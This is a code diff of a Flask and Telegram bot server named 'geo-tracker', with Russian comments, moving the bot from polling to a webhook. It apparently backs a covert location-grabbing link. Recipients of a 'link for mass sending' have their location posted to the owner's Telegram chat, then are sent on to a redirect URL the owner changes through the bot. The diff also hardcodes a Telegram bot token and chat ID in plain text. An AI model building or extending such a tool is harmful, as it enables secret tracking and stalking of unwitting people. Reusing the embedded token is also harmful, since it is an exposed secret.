@@ -1,23 +1,17 @@
 from flask import Flask, request, send_from_directory
+import telebot
 import requests
 from flask_cors import CORS
-import telebot
-from telebot import types
 import os
 
+BOT_TOKEN = '7673156387:AAF6Eop_JRvOY1dncc5ObC_CdBsAsQF2VJU'
+CHAT_ID = 651911888
+
+bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 CORS(app)
 
-BOT_TOKEN = '7673156387:AAF6Eop_JRvOY1dncc5ObC_CdBsAsQF2VJU'  # Твой токен
-CHAT_ID = 651911888  # Твой Telegram ID
-RENDER_URL = 'https://geo-tracker-l5ui.onrender.com'  # Твой Render URL, можно менять через бота
-
-bot = telebot.TeleBot(BOT_TOKEN)
-
-# Храним текущий редирект в переменной
-redirect_url = RENDER_URL
-
-# Множество пользователей, которые присылают новый URL редиректа
+redirect_url = 'https://geo-tracker-l5ui.onrender.com'
 user_waiting_for_url = set()
 
 def is_authorized(message):
@@ -45,10 +39,9 @@ def send_location():
 
 @app.route('/redirect')
 def get_redirect():
-    # Возвращаем текущий редирект, чтобы JS на странице мог знать, куда отправлять
     return {"url": redirect_url}
 
-@app.route("/set_redirect", methods=["POST"])
+@app.route('/set_redirect', methods=['POST'])
 def set_redirect():
     global redirect_url
     data = request.json
@@ -58,13 +51,21 @@ def set_redirect():
         return {"status": "ok"}
     return {"status": "error"}, 400
 
-# --- Телеграм бот ---
+# Webhook route — Telegram будет слать сюда обновления
+@app.route('/' + BOT_TOKEN, methods=['POST'])
+def webhook():
+    json_str = request.get_data().decode('utf-8')
+    update = telebot.types.Update.de_json(json_str)
+    bot.process_new_updates([update])
+    return '', 200
+
+# --- Бот команды и логика ---
 
 @bot.message_handler(commands=['start', 'help'])
 def send_welcome(message):
     if not is_authorized(message):
         return
-    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
+    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
     markup.row('Изменить редирект', 'Скинуть ссылку на мой Render')
     bot.send_message(message.chat.id, "Выбери действие:", reply_markup=markup)
 
@@ -76,8 +77,8 @@ def ask_redirect(message):
 @bot.message_handler(func=lambda m: m.chat.id in user_waiting_for_url and is_authorized(m))
 def set_redirect_from_message(message):
     url = message.text.strip()
+    global redirect_url
     if url.startswith('http://') or url.startswith('https://'):
-        global redirect_url
         redirect_url = url
         bot.send_message(message.chat.id, f"✅ Редирект установлен на:\n{url}")
         user_waiting_for_url.remove(message.chat.id)
@@ -88,14 +89,12 @@ def set_redirect_from_message(message):
 def send_render_link(message):
     bot.send_message(message.chat.id, f"Вот твоя ссылка для рассылки:\n{redirect_url}")
 
-# Запускаем Flask и бота
-
-def run_bot():
-    bot.infinity_polling()
-
 if __name__ == '__main__':
-    from threading import Thread
-    port = int(os.environ.get("PORT", 5000))
-    # Запускаем Flask в отдельном потоке, чтобы бот и сервер работали вместе
-    Thread(target=lambda: app.run(host="0.0.0.0", port=port)).start()
-    run_bot()
+    # Перед запуском надо сбросить webhook (если уже был)
+    bot.remove_webhook()
+    # Указываем telegram, куда слать обновления — обязательно поменяй на свой render-домен
+    WEBHOOK_URL = 'https://geo-tracker-l5ui.onrender.com/' + BOT_TOKEN
+    bot.set_webhook(url=WEBHOOK_URL)
+
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port)
